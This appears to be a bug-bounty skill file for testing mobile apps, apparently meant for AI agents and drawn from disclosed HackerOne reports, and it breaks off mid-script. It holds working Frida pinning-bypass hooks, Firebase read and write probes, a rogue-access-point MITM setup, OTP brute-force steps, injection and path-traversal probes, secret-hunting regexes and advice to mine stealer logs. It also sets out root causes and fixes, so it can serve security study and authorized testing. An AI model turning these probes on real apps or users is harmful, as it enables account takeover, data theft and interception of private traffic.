grep -oE 'AKIA[A-Z0-9]{16}|AIza[A-Za-z0-9_-]{35}|eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*' strings.txt
grep -oE 'cloudinary://[^"]+|firebase_database_url[^<]+|https?://[^" ]+\.firebaseio\.com' strings.txt

# Validate Cloudinary secret (#351555)
curl -s "https://api.cloudinary.com/v1_1/<cloud>/usage"
# Validate Firebase open DB (#1065134)
curl -s "https://<project>.firebaseio.com/.json"
# Validate Facebook App secret (#1641475)
curl "https://graph.facebook.com/oauth/access_token?client_id=<id>&client_secret=<secret>&grant_type=client_credentials"
```

### Auth / OTP / Session Probes
```
# OTP brute-force math (#205000): resend unlimited + 3 activation tries
# = 6/min, 360/hour, 8640/day vs 4-digit (9999) code space

# Mobile login has no CAPTCHA/rate limit (#127202)
POST https://login.newrelic.com/api/v1/tokens   # loop "password" values

# Logout that does not invalidate the token (#1172205)
DELETE /api/v1/logout  -> {"error":"Missing Logout Token Hint"}
GET  /oauth/userinfo   with the same Bearer token  -> still 200

# Response-body match/replace to flip auth flag (#126260)
request:  allowNotActivated":false -> "allowNotActivated":true
response: "isActivated":false      -> "isActivated":true
```

### Cloud / iOS Local-File SSRF
```
# SSRF to local file on iOS client (#746541)
file://<application-path>/<sensitive-file>
# Firebase URLs derived from binary config (#1065134)
https://<project-id>.firebaseio.com/.json
```

### Frida Pinning Bypass (for dynamic interception)
```javascript
Java.perform(function(){
  try { var P = Java.use('okhttp3.CertificatePinner');
    P.check.overload('java.lang.String','java.util.List').implementation = function(){ return; };
  } catch(e){}
  try { var T = Java.use('com.android.org.conscrypt.TrustManagerImpl');
    T.verifyChain.implementation = function(chain){ return chain; };
  } catch(e){}
});
```

### Drozer Content-Provider Probes
```bash
dz> run scanner.provider.finduris -a <pkg>
dz> run scanner.provider.injection -a <pkg>
dz> run app.provider.query content://<authority>/<path> \
      --projection "'"           # error-based SQLi signal (#291764)
dz> run app.provider.read content://<authority>/../../<file>
```
Real targets from the corpus: `content://com.nextcloud.android.providers.UsersAndGroupsSearchProvider`, `content://org.nextcloud.files`, and Mail.ru's `ru.mail.data.contact.ContactsProvider` (#291764, #887968, #242727).

### Frida HTTP-Request Hook (endpoint + header discovery)
```javascript
Java.perform(function(){
  var C = Java.use('okhttp3.OkHttpClient');
  C.newCall.implementation = function(req){
    console.log('[REQ] ' + req.url().toString());
    console.log('[HDRS] ' + req.headers().toString());
    return this.newCall(req);
  };
});
```
Use this when pinning blocks your proxy or when you need the exact header set a request carries (session IDs like `x-mts-ssid`, `x-reddit-session`, device IDs) before replaying it in Burp.

### iOS Transparent-Proxy Setup (no jailbreak, from #168538)
```
1. Burp: Proxy -> Options -> "Generate CA-signed per-host certificates"
   (use Burp's CA, which is NOT trusted on the iPhone).
2. Start a rogue WiFi AP on the same host as Burp.
3. Redirect all HTTPS on the AP to the transparent proxy:
   iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 \
            -j DNAT --to $BURP_IP:$BURP_PORT
4. Connect the iPhone, install no CA, and watch the app's requests in Burp.
```
This recovered an OAuth token sent by Twitter for iOS despite the lack of a trusted CA (#168538); the same pattern applies to any app with broken cert validation (#5786, #55644).

### Firebase / Cloud Config Probes
```bash
# Realtime Database (open read/write) — Zego #1065134
curl -s "https://<project-id>.firebaseio.com/.json"
curl -s -X PUT -d '{"poc":"value"}' "https://<project-id>.firebaseio.com/.json"
# Firestore REST
curl -s "https://firestore.googleapis.com/v1/projects/<project-id>/databases/(default)/documents/users"
# Storage bucket listing
curl -s "https://firebasestorage.googleapis.com/v0/b/<bucket>/o"
```
These URL shapes come directly from `google-services.json` / `strings.xml` extracted earlier — no external recon required (#1065134).

### Signup / Phone-Binding / Session Probes
```
POST /signup  phone=<victim>&code=<any>       # verify without current code (#667740)
POST /signup  email=<victim>&password=<new>   # overwrite victim's password (#187714)
POST /api/v2/users/google_login_auth  id_token=<token-from-other-app>  (#202177)
DELETE /api/v1/logout  -> replay Bearer token at /oauth/userinfo  (#1172205)
```

### DoS / Crash Fuzzing
```
reaction_key = "\0"            # iOS DM reaction crash, persistent (#784676)
URL           = /?%xx          # mobile site crash, propagates via DM/tweet (#500686)
message       = "\u000e\u000f" # unicode DoS (#1058383)
message       = many unicode chars -> app crash on channel (#832217)
page title    = excessively long -> ICQ Android DoS (#801372)
NUL/CR/LF     in any previewed user-controlled field
```

---

## Common Root Causes

1. **Exported component with no permission and unvalidated input** — the dominant root cause. A component is public (`exported=true` or implicit via intent filter) and passes an intent URI/extra straight into a WebView, file loader, or upload service. No `android:permission`, no package check (#377107, #499348, #1115864, #258460, #200427).

2. **WebView JavaScript enabled + attacker-controlled URL/HTML** — `setJavaScriptEnabled(true)` with a URL or `html` extra from an intent, and no scheme allowlist. `javascript:` executes in origin context, `file://` reads local files, external URLs enable UXSS/cookie theft (#189793, #532836, #906433, #2555949, #1011956).

3. **Client-side security decision trusted by the server** — PIN/biometric state, `allowNotActivated`, profile attributes, and role flags are enforced only in the app or in a response flag the attacker can rewrite with match/replace (#637194, #80512, #126260, #165561).

4. **Deeplink triggers state change without CSRF token or confirmation** — because the action comes from a custom scheme, the browser's normal CSRF defenses do not apply (#583987, #805073, #28500).

5. **Missing or inconsistent rate limiting / code expiry** — mobile endpoints lack the CAPTCHA/lockout web has, or a resend endpoint is unlimited while activation is capped. Four-digit codes fall in hours (#202425, #205000, #127202, #160109, #2762462).

6. **Session state not synchronized across clients** — logout, password change, "expire sessions", and app-access revocation update web state but leave the mobile OAuth token valid (#1172205, #1632186, #55530, #194329, #67220, #7041).

7. **Secrets shipped in the binary** — API secrets/full cloud credentials embedded because "it's a client app." Anyone who decompiles gets the same authority as the app (#351555, #1641475, #792850, #753868, #130739).

8. **Unvalidated filename / path in upload-rename flows** — traversal sequences reach native library paths or app-root writes → code execution (#1377748, #1997029, #859469, #1050231).

9. **Permissive cloud config discovered from binary intel** — Firebase RTDB open to write, public storage buckets with test builds, exposed API keys (#1065134, #404822, #488371).

10. **Failure to validate third-party identity tokens** — an `id_token` from a different app/client is accepted because the backend never verifies audience/client ID (#202177); OAuth response codes in logs derivable into tokens (#5314).

11. **Cleartext / unvalidated TLS** — no cert validation or pinning, HTTP endpoints, tokens in query strings (`?auth_token=`) → MITM and search-engine caching (#5786, #168538, #55644, #221558, #12977).

12. **No input sanitization before rendering** — stored/reflected XSS in WebViews and mobile pages, and unhandled special characters causing client DoS (#575562, #380246, #784676, #500686).

13. **Unprotected broadcasts / implicit intents** — sensitive data broadcast without permission, or receivers registered without `broadcastPermission` → any app can read or inject (#185862, #167481, #1596459, #180349).

### Root cause → correct fix (use this in the report)
| Root cause | Fix to recommend | Report anchor |
|---|---|---|
| Exported component without permission | `android:exported="false"` or signature-level `android:permission`; validate caller package and URI scheme | #377107, #200427, #145402 |
| WebView JS + unvalidated URL | Disable JS unless required; allowlist schemes/hosts; validate before `loadUrl` | #499348, #1011956, #575562 |
| Deeplink state change | Require CSRF token / explicit user confirmation; treat scheme like a cross-origin request | #583987, #805073 |
| Missing rate limit / expiry | Server-side throttling, CAPTCHA, code expiry, attempt caps that survive resend | #202425, #205000, #127202 |
| Session not invalidated | Centralize token revocation across all clients; honor password change / revoke events | #1172205, #1632186, #67220 |
| Secret in binary | Remove from client; rotate immediately; move to server-side proxy; use publishable keys only | #351555, #1641475, #792850 |
| Filename path traversal | Reject `../` and path separators; use a random storage name; verify resolved path stays in target dir | #1377748, #1997029 |
| Permissive Firebase/cloud | Lock Firestore/RTDB rules, make buckets private, restrict API keys by referrer | #1065134, #404822 |
| Weak OAuth token validation | Verify `aud`/`iss`, bind token to client ID, never log auth codes | #202177, #5314 |
| Unvalidated rendering input | Sanitize before display; disable JS for untrusted HTML; handle special characters safely | #575562, #784676, #500686 |

---

## Bypass Techniques

### Component / Path Filters
- **Path normalization:** if `/data/data/<pkg>/...` is blocked, use the symlinked `/data/user/0/<pkg>/...` (#377107); likewise `/data/data/com.harvestapp/...` in #161710.
- **Exported-but-"not exported":** some providers are reachable despite appearing non-exported due to permission quirks (#272044); test with Drozer regardless of the manifest claim.
- **Host validation bypass:** Android host-validated URL loading can be bypassed with URL parsing tricks (#431002 — "Golden techniques to bypass host validations"); combine with `javascript:`/`file:` fragments.

### WebView / URL-Scheme Bypasses
- **Scheme confusion:** when `http/https` is enforced superficially, `javascript://host%0A<payload>`, `file:///...`, `intent://...#Intent;...;end`, and iframe auto-launch of custom schemes bypass the check (#499348, #2555949, #28500).
- **CSP not enforced by the in-app browser:** a site's `Content-Security-Policy` HTTP header is ignored in MetaMask Browser while a `<meta>` CSP is honored — downgrade the defense and execute XSS (#1941767).
- **Domain highlighting / URL eliding:** disable or confuse the visual trust indicator on mobile — no domain highlight on HackerOne interstitial in Chrome/Edge mobile (#2553026), incorrect URL eliding in Brave Shields (#2501378), iOS address-bar spoofing (#176929, #175958), trailing-dot phishing bypass (#1068505).

### PIN / Biometric / Auth Bypasses
- **Deeplink bypass:** while the app is open, trigger `DeepLinkActivity`/a privileged activity via scheme so the auth check never runs (#637194).
- **Unlimited retries:** brute-force the 4-digit PIN because the app accepts unlimited tries (#2245437, #50884).
- **Runtime method invocation:** call `userAuthenticated` directly on `CBPINViewController` with SnoopIt/Frida (#80512).
- **Response match/replace:** flip `isActivated`/`allowNotActivated` flags in the intercepted response (#126260).
- **Cross-app `id_token` reuse:** a Google `id_token` minted for a different app is accepted at the victim backend (#202177).

### Session / State Bypasses
- Replay the original bearer token after "logout" (#1172205), after "expire sessions" (#67220), after password change (#194329), or after revoking app access via a notification deep link (#1632186).

### Filename / Path Bypasses
- Rename an attachment to `../../../lib/<native>.so` so the download lands in the native lib dir and gets loaded (#1377748).
- Use the `file://` URI form the exported activity actually accepts rather than the one it documents (#377107, #161710).

### When the App Is "Obfuscated / Hardened"
- Reverse older versions from APKMirror version history — removed secrets often still authenticate server-side.
- Don't stop at `grep password`: use high-signal patterns (AKIA, AIza, eyJ, `cloudinary://`, `.firebaseio.com`).
- Don't trust an expired JWT as dead intel: endpoint paths, signing algorithm, and claim structure remain useful (#753868-style pattern).

---

## Gate 0 Validation

Before writing the report, confirm all three:

1. **What can the attacker DO right now?**
   - Exported component: show the exact `adb`/intent that reads the private file, executes JS, or writes outside the sandbox — and show the resulting data/effect (#377107, #258460, #1377748).
   - Secret extraction: show a **live** API response proving the key still grants access (#351555, #1641475, #1065134). An expired token alone is not a finding.
   - OTP/session bug: show the ATO (successful login as victim) or the still-valid token after revocation (#205000, #1172205).
   - "The manifest exports a component" or "the binary contains a string" alone is insufficient — show the reachable impact.

2. **What does the victim LOSE?**
   - Private files / DBs / cookies (file theft, UXSS), money (Razer RedPacket #753280, Reddit coin inflation #801743), account control (ATO #2762462, #205000), privacy (tweets un-protected #472013/#519059, location broadcast #185862, notification email leak #977212), or device usability (persistent DoS #784676, #500686).
   - Quantify blast radius: one user vs. all uploads (Cloudinary #351555) vs. all waitlist numbers (Curve #902733) vs. every installed app (broadcast leaks).

3. **Can it be reproduced in 10 minutes from scratch?**
   - Is the vulnerable component still exported in the current store version? Does the secret still authenticate today? Does the token still work after revocation?
   - Is the PoC a single adb command / HTTP request / HTML link that a second person can run without prior context?
   - For blind/stored XSS and notification-based bugs, is the trigger reliable (not one-time/flaky — see the difficulty reproducing #1632186)? Resolve flakiness before submitting.

### Mobile-specific Gate 0 questions

- **Exported component:** does the *current store version* still export it and still accept your URI? A fix may have silently landed in a newer build. State the version you tested.
- **Secret:** does it authenticate *today*? Include the timestamped API response. An expired JWT is intel; a live Cloudinary/Facebook/Firebase key is a finding (#351555, #1641475, #1065134).
- **OTP/ATO:** can you actually log in as a victim account, or only guess a code? Show the successful authenticated session (#205000, #2762462).
- **Session:** did you replay the *same* token after the revocation action? Show the before/after responses (#1172205, #1632186).
- **DoS:** is the breakage persistent across app restarts and does recovery require an out-of-band action (web login to delete a message) — as in #784676?
- **WebView/UXSS:** does the injected JS run in a privileged origin with access to cookies or the JS bridge, or only in a blank page (#189793, #532836)?
- **Privacy:** does the leak expose one user's data or every user's (#902733 vs #1225164)? Scope the blast radius.
- **Reproduction artifact:** can a triager run a single `adb` command, open a single HTML link, or send a single HTTP request and see the same result? Attach the PoC app/source when needed.

### Never-submit list (from corpus patterns)

- A hardcoded *publishable* key with no privileged capability, with no live validation.
- A component that is exported but whose sink is unreachable / requires an impossible intent shape.
- A crash that only affects a self-modified PoC app rather than the target client (contrast #1115864, where the real app crashed on next launch).
- A "session issue" where the token was never actually revoked server-side to begin with — verify the revoke endpoint's success response first.
- A URL "echoed in an error" with no outbound fetch or data read — apply the OOB discipline from `hunt-ssrf`.

---

## Real Impact Examples

### Scenario A: Exported WebView Activity → UXSS → Cookie/Token Theft (Twitter Lite / EXNESS / Quora Pattern)
A third-party app (or a web page via a browsable intent) starts an exported `TwitterLiteActivity` with `-d "javascript://example.com%0A alert(1);"` or `file:///sdcard/1.html`. Because the activity loads the intent URI into a WebView with JavaScript enabled and no scheme allowlist, the attacker executes JavaScript in the app's origin, reads the `www.quora.com`/trading-app cookies, and in old Android (≤4.2) can reach the JS bridge for RCE (#189793, #499348, #532836, #906433). The victim loses session tokens and any data behind the WebView — all from an app they never intentionally granted anything to. The same primitive underlies URL-scheme validation bypass for JS execution (#1737358) and arbitrary file write via deeplink (#1768166).

### Scenario B: Hardcoded Cloud Secret → Full Data Store Compromise (Reverb/Cloudinary + Zego/Firebase Pattern)
Decompiling `com/reverb/app/CloudinaryFacade.java` reveals `cloudinary://<id>:<secret>@reverb`. The researcher calls `https://api.cloudinary.com/v1_1/reverb/usage`, sees ~1.9B requests/36M resources, and confirms the key can read, replace, and delete **all** user uploads (#351555). In the parallel Zego case, `strings.xml` exposes `firebase_database_url`; hitting `https://api-project-615509201590.firebaseio.com/.json` returns the whole DB and a `PUT` writes attacker data (#1065134). The victim loses confidentiality and integrity of every stored asset — a far larger blast radius than the single app install suggests, because the secret is the *server-side* credential.

### Scenario C: Rate-Limit-Free OTP + Capped Activation → Account Takeover of Any Phone Number (Grab Pattern)
The Android app exposes `.../profiles/activationsms` (resend, no global rate limit) and `.../profiles/activate` (only 3 attempts before expiry). By resending every 30 seconds and trying 3 codes each cycle, an attacker gets 8,640 guesses/day against a 4-digit code and takes over any account from a phone number alone (#205000); the same flaw bypasses 2FA at `/profiles/edit` (#202425). The victim loses their account — and, in Grab's other reports, their private messages (cached by search engines, #221558) and location data (#185862). The fix is server-side rate limiting and code expiry, not a client change.

### Scenario D: Session Revocation Desync → Ongoing Account Access After Revoke (Shopify/Reddit Pattern)
A user revokes the mobile app's access from `old.reddit.com` and confirms the app no longer works. Days later, a "chat invitation accept" push notification arrives; tapping it re-launches the app with a previously revoked account still usable (#1632186). In the Shopify variant, calling `DELETE /api/v1/logout` returns `{"error":"Missing Logout Token Hint"}` and the `Bearer atkn_...` token remains valid against `GET /oauth/userinfo` (#1172205). Related variants: changing the password does not log out Android sessions (#55530, #194329), and an admin clicking "Expire User Sessions" leaves the iOS app logged in (#67220). The victim believes they have revoked access but an attacker holding the token retains it — a direct violation of the security guarantee the UI advertises, fixed only by server-side, cross-client token invalidation.

### Scenario E: Exported Service → Silent Exfiltration of App-Private Cookies (Quora Pattern)
Quora's Android app exported `net.gotev.uploadservice.UploadService` with `android:exported="true"`. Any third-party app can build an `UploadTaskParameters` object pointing at `/data/data/com.quora.android/app_webview/Cookies` and set `serverUrl` to an attacker-controlled host, then start the service — the target app reads its own private cookie file and uploads it (#258460). Tied to the Harvest/ownCloud file-theft family (#161710, #377107), this shows that "the file is inside the app sandbox" is not a defense once an exported component will read it on a stranger's instruction. The victim loses session cookies without any interaction beyond installing the malicious app.

---

## Disclosed Report Citations (30 — all IDs verified in study pack / TOPMOBILE)

1. **Chrome — CVE-2019-5765: 1-click HackerOne account takeover on all Android devices** ([H1 #563870](https://hackerone.com/reports/563870)) — activity/intent hijack → account takeover, 2019 / $0
2. **TikTok — Multiple bugs leads to RCE on TikTok for Android** ([H1 #1065500](https://hackerone.com/reports/1065500)) — chained bugs → RCE, 2020 / $0
3. **Slack — AWS bucket leading to iOS test build code and configuration exposure** ([H1 #404822](https://hackerone.com/reports/404822)) — cloud misconfiguration / info disclosure, 2015 / $1,500
4. **Razer — [Razer Pay Mobile App] Broken access control allowing other user's bank account to be deleted** ([H1 #757095](https://hackerone.com/reports/757095)) — broken access control / IDOR, 2019 / $1,000
5. **Undisclosed — Golden techniques to bypass host validations in Android apps** ([H1 #431002](https://hackerone.com/reports/431002)) — host-validation bypass, 2018 / $0
6. **X / xAI — Periscope android app deeplink leads to CSRF in follow action** ([H1 #583987](https://hackerone.com/reports/583987)) — deeplink CSRF, 2019 / $1,540
7. **Mail.ru — read new emails from any inbox IOS APP in notification center** ([H1 #977212](https://hackerone.com/reports/977212)) — notification content disclosure, 2020 / $10,000
8. **X / xAI — url that twitter mobile site can not load** ([H1 #500686](https://hackerone.com/reports/500686)) — client-side DoS via invalid `%xx`, 2019 / $1,120
9. **Mail.ru — XSS via message subject - mobile application** ([H1 #368912](https://hackerone.com/reports/368912)) — stored XSS, 2018 / $1,000
10. **X / xAI — Changing email address on Twitter for Android unsets "Protect your Tweets"** ([H1 #472013](https://hackerone.com/reports/472013)) — privacy / state desync, 2018 / $2,940
11. **ownCloud — Possible to steal any protected files on Android** ([H1 #377107](https://hackerone.com/reports/377107)) — exported activity + `/data/user/0/` path bypass, 2018 / $750
12. **Reverb.com — Disclosure of all uploads to Cloudinary via hardcoded api secret in Android app** ([H1 #351555](https://hackerone.com/reports/351555)) — hardcoded cloud secret, 2018 / $0
13. **MTN Group — Ability to Add and Verify Uncontrolled Mobile Numbers Leading to Account Takeover (ATO)** ([H1 #2762462](https://hackerone.com/reports/2762462)) — phone-number ATO, 2023 / $0
14. **Shopify — Bypass of biometrics security functionality is possible in Android application (com.shopify.mobile)** ([H1 #637194](https://hackerone.com/reports/637194)) — biometric bypass via deeplink, 2019 / $500
15. **MetaMask — MetaMask Browser URL and Transaction Origin Spoofing (Android/iOS)** ([H1 #1751333](https://hackerone.com/reports/1751333)) — URL / origin spoofing, 2021 / $0
16. **Razer — [Razer Pay Android App] Multiple vulnerabilities chained to allow "RedPacket" money to be stolen** ([H1 #753280](https://hackerone.com/reports/753280)) — chained logic flaws → theft, 2019 / $1,000
17. **Pornhub — Reflect XSS on Mobile Search page** ([H1 #380246](https://hackerone.com/reports/380246)) — reflected XSS in `search`, 2018 / $250
18. **Curve — Sensitive Info Leak — retrieve all users mobile numbers at /api/waitlist/us** ([H1 #902733](https://hackerone.com/reports/902733)) — mobile API info leak, 2020 / $0
19. **Grab — Authorization bypass using login by phone option + horizontal escalation** ([H1 #205000](https://hackerone.com/reports/205000)) — OTP rate-limit ATO, 2017 / $0
20. **Mattermost — Persistant Arbitrary code execution in mattermost android** ([H1 #1115864](https://hackerone.com/reports/1115864)) — exported share activity + path traversal → ACE, 2021 / $0
21. **Shopify — Insufficient session expiration in the com.shopify.ping android app** ([H1 #1172205](https://hackerone.com/reports/1172205)) — token not invalidated on logout, 2021 / $0
22. **Shopify — URL Scheme Validation Bypass in Shopify Mobile App Allows Javascript Execution** ([H1 #1737358](https://hackerone.com/reports/1737358)) — URL-scheme bypass → JS execution, 2020 / $0
23. **GitHub Security Lab — Java: CWE-749 Unsafe resource loading in Android WebView leaking to injection attacks** ([H1 #1011956](https://hackerone.com/reports/1011956)) — unsafe WebView resource loading, 2020 / $2,300
24. **Zego — Firebase Database Takeover in Zego Sense Android app** ([H1 #1065134](https://hackerone.com/reports/1065134)) — open Firebase RTDB, 2020 / $0
25. **X / xAI — Periscope iOS app CSRF in follow action due to deeplink** ([H1 #805073](https://hackerone.com/reports/805073)) — deeplink CSRF, 2020 / $2,940
26. **Nextcloud — Default Nextcloud Server and Android Client leak sharee searches to Nextcloud** ([H1 #1167916](https://hackerone.com/reports/1167916)) — default-config privacy leak, 2021 / $750
27. **Undisclosed — Android: Explanation of Access to app protected components vulnerability** ([H1 #951691](https://hackerone.com/reports/951691)) — protected-component access, 2019 / $0
28. **VK.com — Path Traversal в iOS приложении** ([H1 #1050231](https://hackerone.com/reports/1050231)) — iOS path traversal, 2020 / $700
29. **X / xAI — Android WebViews in Twitter app are vulnerable to UXSS due to configuration and CVE-2020-6506** ([H1 #906433](https://hackerone.com/reports/906433)) — WebView UXSS, 2020 / $560
30. **Evernote — 2 click Remote Code execution in Evernote Android** ([H1 #1377748](https://hackerone.com/reports/1377748)) — attachment-rename path traversal → RCE, 2021 / $0

---

## Related Skills & Chains

- **`apk-redteam-pipeline`** — the acquisition/decompilation/secret-grep engine that feeds this skill. Chain primitive: Play Store scrape → APKPure/APKMirror download → `jadx` → 60-pattern secret grep → pinned-cert extraction → exported-component list → hand the component/secret inventory to this skill's probe checklist.
- **`hunt-api-misconfig`** — the mobile app is just a client for the API; once you have the endpoint inventory, probe it directly. Chain primitive: APK reveals `/api/passenger/v2/profiles/activate` and `/oauth/userinfo` → rate-limit/IDOR/mass-assignment probes → ATO (#205000, #1172205).
- **`cloud-iam-deep`** — secrets extracted from the binary often authenticate to a cloud plane. Chain primitive: APK strings yield AWS key / GCP SA JSON / Cloudinary secret → validate live → enumerate permissions → privilege escalation (#351555, #1641475, #792850).
- **`hunt-cloud-misconfig`** — Firebase/Firestore/Storage misconfig discovered from `strings.xml`. Chain primitive: `firebase_database_url` → `/.json` public read/write → data exfil or write (#1065134), exposed test-build bucket (#404822).
- **`hunt-rce`** — path traversal in attachment/file handling reaches native code; exported components can reach `Runtime.exec`. Chain primitive: `../../../lib/lib*.so` rename → native lib overwrite → 2-click RCE (#1377748, #1115864).
- **`hunt-ssrf`** — mobile clients that fetch URLs or expose local-file loads are SSRF/LFI primitives against device and cloud metadata. Chain primitive: iOS local-file SSRF via app path (#746541) + server-side URL fetchers → cloud metadata; apply its OOB-Or-It-Didn't-Happen gate to any blind callback claim.
- **`offensive-osint`** — the app is one node in the org recon graph. Chain primitive: cert SAN/API hostname from APK → certificate-transparency lookup → sibling subdomains → expanded surface; public code search for leaked source/config (#404822, #1167916).
- **`triage-validation`** — apply its 7-question gate with a mobile emphasis: "does this credential still authenticate today?", "is the component still exported in the current store version?", "does the revoked token still work?". Gate 0 above is the mobile-specific instantiation.
- **`security-arsenal`** — load the URL/host-validation bypass table (#431002) and the intent/deeplink payload catalog before testing filters.
- **`redteam-report-template`** — frame mobile-static findings as concrete attacker capability, not "obfuscation is bypassable": include binary version, package ID, exact extraction steps, and a one-command reproduction (#351555, #377107).


---

## Merged Source Knowledge

This section consolidates **120 unique knowledge blocks** from 9 curated source skills in `hunt-skills/`, `normal-skills/`, and `offensive-skills/`. Blocks overlapping the report-mined sections above were dropped; the complete, globally deduplicated source corpus is archived at `references/source-knowledge.md` (146 unique sections). No source section appears in more than one hunt skill.


### From `hunt-skills/apk-redteam-pipeline/SKILL.md`

## When to use this skill

Trigger when:
- Recon surfaces 1+ mobile apps under the target's developer name (Play Store dev page)
- A web app hosts `*.apk` files directly (e.g. `Recruitz.apk` found on a subdomain during one engagement)
- APK package IDs leaked via stealer logs (e.g. `com.<brand>.app`, `com.<brand>.<sub-brand>` patterns in stealer dump format)
- Customer-facing app, dealer/partner portal, or employee mobile companion app is in scope
- Bug bounty program lists Android in scope

DO NOT use for:
- iOS-only targets (different pipeline — IPA reverse, MobSF, frida-ios-dump)
- React Native / Flutter web apps already covered by JS bundle analysis
- Server-side only assessments

---

# Find developer page from the target's brand name
curl -sk -A "Mozilla/5.0" "https://play.google.com/store/apps/developer?id=<Brand+Name>" -o /tmp/dev.html

# Extract package IDs
grep -oE 'id=[a-zA-Z0-9._]+' /tmp/dev.html | sort -u
```

Example output (anonymized — 7 packages typical for a multi-brand conglomerate):
```
com.events.<brand>build
com.<corp>.<sub-brand-1>
com.<corp>.<sub-brand-2>
com.<corp>.<flagship>
com.<corp>.<product-line-1>
com.<corp>.<product-line-2>
com.<corp>.<sub-brand-3>
```

### Cross-reference with stealer logs
Stealer-log format includes package names like `*@com.<corp>.<app>` — extract these from `creds_userpass.txt` if you have a leaked dump.

### Brand permutation guesses (multi-brand conglomerate patterns)
```
com.<brand>.app
com.<brand>.mobile  
com.<brand>.android
com.<brand>connect.app
in.<brand>.dealer
in.co.<brand>.app
```

---

# Follow 302 redirects to actual download
curl -sk -L --max-time 60 \
  "https://d.apkpure.net/b/APK/<package_id>?version=latest" \
  -o "<package_id>.apk"

### Secondary: APKMirror search
```bash
curl -sk -A "Mozilla/5.0" "https://www.apkmirror.com/?post_type=app_release&searchtype=apk&s=<brand>" \
  | grep -oE 'href="[^"]+\.apk[^"]*"' | sort -u
```

### Tertiary: APKPure web search
```bash
curl -sk "https://apkpure.com/search?q=<brand>" | grep -oE 'data-dt-app="[^"]+"'
```

### XAPK vs APK
- `.xapk` = a zip containing multiple split APKs (base + config.armeabi-v7a + config.en + etc.)
- Unzip outer first, then unzip the inner `base.apk` or `<package>.apk`
- Some apkpure downloads return truncated XAPK with missing EOCD signature — symptom of CDN rate-limiting; rotate IP and retry, OR use `7z x` which is more lenient than `unzip`

```bash

# For nested XAPK
for inner in extracted_<package>/*.apk; do
  mkdir -p "extracted_<package>/$(basename "$inner" .apk)"
  unzip -o "$inner" -d "extracted_<package>/$(basename "$inner" .apk)"
done
```

---

# For XAPK that contains multiple APKs
for inner in extracted_<package>/*.apk; do
  jadx -d decompiled_<package>_$(basename "$inner" .apk)/ "$inner"
done
```

For a fast "strings only" pass without full decompilation:
```bash
find extracted_<package> -name "classes*.dex" -exec strings -8 {} \; > strings_<package>.txt
```

---

# URL grep — owned-domain references
grep -oE 'https?://[a-zA-Z0-9.-]+\.(target1|target2|target3)\.(com|io|net|in)[a-zA-Z0-9./_?=&%-]*' strings_<package>.txt | sort -u

# Internal IP / port URLs
grep -oE 'https?://(10\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.|127\.)[0-9.]+(:[0-9]+)?[a-zA-Z0-9./_?=&-]*' strings_<package>.txt

# Cloud credentials
grep -oE 'AKIA[A-Z0-9]{16}'                            # AWS Access Key
grep -oE 'aws_secret_access_key[\s:=]+[A-Za-z0-9/+=]{40}' # AWS Secret
grep -oE 'AIza[A-Za-z0-9_-]{35}'                       # Google API key
grep -oE 'ya29\.[A-Za-z0-9_-]+'                        # Google OAuth refresh token
grep -oE 'gh[ps]_[A-Za-z0-9]{36}'                      # GitHub PAT
grep -oE 'glpat-[A-Za-z0-9_-]{20}'                     # GitLab PAT
grep -oE 'xox[pbar]-[A-Za-z0-9-]+'                     # Slack token
grep -oE 'sk-[A-Za-z0-9]{48}'                          # OpenAI API key
grep -oE 'sk-ant-[A-Za-z0-9_-]{90,}'                   # Anthropic API key
grep -oE 'AC[a-f0-9]{32}'                              # Twilio Account SID
grep -oE 'sk_live_[A-Za-z0-9]{24}'                     # Stripe live key
grep -oE 'pk_live_[A-Za-z0-9]{24}'                     # Stripe publishable
grep -oE 'mailgun-[A-Za-z0-9-]{40}'                    # Mailgun
grep -oE 'SG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43}'    # SendGrid

# Firebase
grep -oE '"(api_key|project_id|database_url|storage_bucket|client_id|mobilesdk_app_id|google_app_id|gcm_defaultSenderId)"\s*:\s*"[^"]+"' \
  extracted_<package>/res/values/strings.xml \
  extracted_<package>/google-services.json \
  decompiled_<package>/resources/AndroidManifest.xml 2>/dev/null

# Hardcoded passwords (heuristic — many false positives, manual review)
grep -oE '"password"\s*:\s*"[^"]+"|password\s*=\s*"[^"]+"' decompiled_<package>/sources/**/*.java 2>/dev/null
```

# Customer-facing APK shipped a hardcoded URL of this shape:
https://api.<client>.example/<path-token>/<resource-token>?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.<payload>.<sig>

# Find .cer / .der / .pem files in assets/
find extracted_<package>/assets -iname "*.cer" -o -iname "*.der" -o -iname "*.pem" -o -iname "*.crt" 2>/dev/null

# Or in network_security_config.xml
find extracted_<package> -name "network_security_config.xml" -exec cat {} \;

# For each cert, extract subject + SAN (might reveal new internal API hosts)
for cert in $(find extracted_<package>/assets -iname "*.cer"); do
  echo "=== $cert ==="
  openssl x509 -in "$cert" -noout -subject -issuer -dates 2>/dev/null
  openssl x509 -in "$cert" -noout -text 2>/dev/null | grep -E 'Subject:|DNS:|Issuer:|Validity'
done
```

### Real-world example
A customer-facing APK from an authorized engagement contained `assets/api_<service>_<domain>_com.cer` — revealed the existence of an `api.<service>.<domain>.example` asset that had NOT surfaced in passive recon.

---

## Stage 5 — Exported component enumeration

AndroidManifest.xml lists components. Exported ones (especially with `android:exported="true"` or implicit-export via intent-filter) can be triggered by other apps — potential intent-injection attack surface.

```bash

# Decode binary AndroidManifest if needed
apktool d <package>.apk -o decoded_<package>/    # apktool decodes binary manifest

# Or read directly from jadx output
cat decompiled_<package>/resources/AndroidManifest.xml | grep -E '<(activity|service|receiver|provider)' | head -50

# Filter exported
grep -E 'android:exported="true"' decompiled_<package>/resources/AndroidManifest.xml
```

For each exported component, check:
- Does it accept extras that flow into a WebView (intent → WebView → XSS / file://)
- Does it accept URI extras (potential SSRF via deep link)
- Does it pass extras to other Activities (intent redirection)

---

# google-services.json — full Firebase config
find extracted_<package> -name "google-services.json" -exec cat {} \; | python3 -m json.tool

## Stage 7 — Runtime instrumentation (Frida)

For when static analysis isn't enough — you want to dump tokens at runtime, bypass cert pinning, or trace API calls.

### Setup
```bash
pip install --break-system-packages frida-tools objection
adb devices  # ensure device/emulator connected

# Push frida-server to device (root required, or use rooted emulator like Genymotion / x86_64 AVD)
```

### Cert-pinning bypass (universal)
```javascript
// frida-script-pinning-bypass.js
Java.perform(function() {
    // OkHttp
